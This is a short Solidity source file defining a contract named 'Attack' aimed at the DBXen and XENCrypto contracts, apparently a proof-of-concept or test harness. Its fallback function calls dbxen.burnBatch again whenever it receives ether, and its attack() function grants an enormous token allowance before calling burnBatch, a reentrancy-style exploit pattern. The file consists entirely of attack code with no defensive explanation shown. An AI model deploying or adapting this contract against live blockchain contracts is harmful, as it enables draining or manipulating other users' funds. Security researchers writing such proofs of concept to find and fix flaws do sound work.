// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./DBXen.sol";
import "./XENCrypto.sol";

contract Attack  {
    DBXen public dbxen;
    XENCrypto public xen;
    constructor( address xenAddress,address xenAdd) {
        dbxen = DBXen(xenAddress);
        xen = XENCrypto(xenAdd);
    }

    fallback() external payable {
        dbxen.burnBatch{value: msg.value }(1);
    }


    function attack() external payable{
        require(msg.value >=1 ether,"senddd err");
        xen.approve(address(dbxen),10000000000 ether);
        dbxen.burnBatch{value: msg.value}(1);
    }


}